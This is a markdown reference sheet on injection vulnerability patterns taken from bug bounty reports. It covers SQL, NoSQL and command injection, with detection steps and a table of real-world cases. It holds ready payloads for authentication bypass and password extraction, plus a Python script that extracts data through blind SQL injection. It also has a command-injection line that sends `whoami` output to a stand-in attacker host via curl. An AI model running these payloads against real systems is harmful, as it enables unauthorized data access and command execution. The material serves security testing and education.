# Injection Vulnerability Patterns

Common injection vulnerability patterns derived from real-world bug bounty reports. Covers SQL, NoSQL, command, and template injection vectors.

---

## Root Cause Categories

### 1. Direct Input Concatenation in SQL Queries

**Root Cause:** User input is directly concatenated into SQL queries without parameterization or sanitization. The application fails to distinguish between code and data.

**Detection Strategy:**
1. Identify URL parameters, POST body fields, and request headers that interact with databases
2. Inject SQL metacharacters (`'`, `"`, `)`, `;`, `--`, `#`) and observe error messages or behavioral changes
3. Use timing-based detection for blind cases: inject `OR 1=1` vs `OR 1=2` and compare responses
4. Use database-specific probing: e.g., `SLEEP(5)` for MySQL, `WAITFOR DELAY '0:0:5'` for MSSQL

### 2. Parameterized Path Injection

**Root Cause:** Route parameters (e.g., `/api/users/{id}`) are used in database queries without parameterization, similar to query parameters. Path segments are often overlooked for injection testing.

**Detection Strategy:**
1. Test all numeric path parameters with SQL metacharacters
2. Use boolean-based comparison: `/api/items/1` vs `/api/items/1 OR 1=1` vs `/api/items/1 OR 1=2`
3. Compare response body sizes and status codes between true and false conditions

### 3. NoSQL Operator Injection

**Root Cause:** JSON or form-encoded inputs are directly passed to NoSQL queries (MongoDB, etc.) without validation. Special operators like `$ne`, `$regex`, `$where` are not filtered.

**Detection Strategy:**
1. Submit JSON bodies with NoSQL operators: `{"username": {"$ne": ""}, "password": {"$ne": ""}}`
2. Test URL-encoded form equivalent: `username[$ne]=&password[$ne]=`
3. Check for type confusion: submit boolean/number where string is expected
4. Use regex extraction: `{"username": {"$regex": "^a"}}` to brute-force values

### 4. Blind SQL via Conditional Responses

**Root Cause:** SQL injection exists but no data is directly returned; the attacker can infer results based on response differences (HTTP status, body size, redirect).

**Detection Strategy:**
1. Verify injection point with `OR 1=1--` vs `OR 1=2--` response comparison
2. Extract data character by character using `SUBSTRING` and binary search
3. Use `UNION SELECT NULL,NULL,...` with varying column counts for column discovery
4. Automate extraction with SQLMap for efficiency

### 5. Second-Order Injection

**Root Cause:** Malicious input is stored in the database without sanitization, then retrieved and used unsafely in a later operation (SQL query, file include, eval).

**Detection Strategy:**
1. Register/store data containing SQL metacharacters in application fields
2. Trigger operations that process the stored data (search, export, admin review)
3. Observe if errors or SQL behavior changes indicate injection

### 6. Command Injection via Shell Execution

**Root Cause:** User input is passed to system shell commands (e.g., `system()`, `exec()`, subprocess calls) without proper escaping. Common in diagnostic features (ping, traceroute, nslookup).

**Detection Strategy:**
1. Identify features that interact with the OS (ping, DNS lookup, file operations, compression)
2. Inject command separators: `;`, `|`, `||`, `&&`, `` ` ``, `$()`
3. Use out-of-band detection: `curl http://attacker-controlled.net/$(whoami)`
4. Test time-based: `; sleep 5`

---

## Common Attack Vectors

### SQL Injection - Boolean-Based Discovery

```http
-- True condition returns data
GET /api/users/1
GET /api/users/1 OR 1=1--

-- False condition returns empty/no data
GET /api/users/1 OR 1=2--

-- Extract data character by character
GET /api/users/1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
```

### SQL Injection - Time-Based Blind

```http
-- MySQL
GET /api/item?id=1 AND SLEEP(5)--
GET /api/item?id=1 OR IF(1=1,SLEEP(5),0)--

-- MSSQL
GET /api/item?id=1; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
GET /api/item?id=1; SELECT PG_SLEEP(5)--

-- Oracle
GET /api/item?id=1 AND DBMS_PIPE.RECEIVE_MESSAGE('test',5)--
```

### SQL Injection - Union-Based Extraction

```http
-- Determine column count with NULLs
GET /api/item?id=1 UNION SELECT NULL--
GET /api/item?id=1 UNION SELECT NULL,NULL--
GET /api/item?id=1 UNION SELECT NULL,NULL,NULL--

-- Extract database metadata
GET /api/item?id=1 UNION SELECT 1,@@version,database()--
GET /api/item?id=1 UNION SELECT 1,user(),3--
```

### NoSQL Injection (MongoDB)

```json
// Auth bypass via $ne
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}

// Extract data via $regex (blind)
POST /api/search HTTP/1.1
Content-Type: application/json

{"username": {"$regex": "^a"}}

// $where JavaScript injection
POST /api/search HTTP/1.1
Content-Type: application/json

{"$where": "this.password.length > 10"}
```

### Blind SQL Injection - Character Extraction

```python
import requests

url = "http://target.com/api/items/1%20and%20{}--"

# Character-by-character extraction via binary search
charset = "abcdefghijklmnopqrstuvwxyz0123456789_-"
extracted = ""

for pos in range(1, 33):
    for c in charset:
        # Test if character at position matches
        cond = f"SUBSTRING((SELECT database()),{pos},1)='{c}'"
        r = requests.get(url.format(cond))
        if "normal response" in r.text:  # adjust based on app behavior
            extracted += c
            break
```

---

## Real-World Case References

| Report | Vulnerability | Technique | Bounty |
|--------|---------------|-----------|--------|
| inDrive  | Blind SQLi in URL path parameters | Boolean-based: `or 1=1--` vs `or 1=2--` | $4,134 |
| Rocket.Chat | NoSQL auth bypass via $ne operator | `{"username":{"$ne":""}}` on OAuth login | Bounty |
| IBM | Blind SQLi in legacy CGI | Time-based blind in CGI parameter | Bounty |
| Mars | SQLi in theme_name parameter | Boolean-based blind in CMS theme | Bounty |
| U.S. DoD | SQLi in entryid parameter | Error-based SQLi in admin interface | Bounty |
| LASCO | SQLi in CME Query parameter | Union-based extraction from PostgreSQL | Bounty |
| curl  | Arbitrary config file inclusion (CWE-73) | `--config` file with `url=file:///etc/passwd` | N/A |
| Apache  | Backend output to internal redirect (CVE-2024-38476) | Malicious response header triggers SSRF/RCE | $4,920 |
